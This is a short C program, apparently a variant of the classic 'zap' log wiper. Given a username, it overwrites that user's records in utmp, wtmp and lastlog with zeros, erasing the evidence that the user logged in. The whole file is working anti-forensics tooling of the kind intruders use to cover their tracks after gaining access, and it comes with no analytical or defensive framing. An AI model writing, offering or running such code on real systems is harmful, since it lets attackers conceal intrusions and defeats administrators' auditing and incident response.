#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <utmp.h>
#include <lastlog.h>
#include <pwd.h>

#define bzero(x,y) memset(x,0,y)

int f;

void kill_tmp(char *name,char *who){
	struct utmp utmp_ent;

	if((f=open(name,O_RDWR))>=0){
		while(read(f,&utmp_ent,sizeof(utmp_ent))>0){
			if(!strncmp(utmp_ent.ut_name,who,strlen(who))){
				bzero((char *)&utmp_ent,sizeof(utmp_ent));
				lseek(f,-(sizeof(utmp_ent)),SEEK_CUR);
				write(f,&utmp_ent,sizeof(utmp_ent));
			}
		}
		close(f);
	}
}

void kill_lastlog(char *who){
	struct passwd *pwd;
	struct lastlog newll;

	if((pwd=getpwnam(who))!=NULL){
		if((f=open("/usr/adm/lastlog",O_RDWR))>=0){
			lseek(f,(long)pwd->pw_uid * sizeof(struct lastlog),0);
			bzero((char *)&newll,sizeof(newll));
			write(f,(char *)&newll,sizeof(newll));
			close(f);
		}
	}
	else printf("%s: ?\n",who);
}

int main(int argc, char *argv[]){
	if(argc==2){
		kill_tmp("/run/utmp",argv[1]);
		kill_tmp("/var/log/wtmp",argv[1]);
		kill_lastlog(argv[1]);
		printf("zap!\n");
	}else printf("error\n");
}
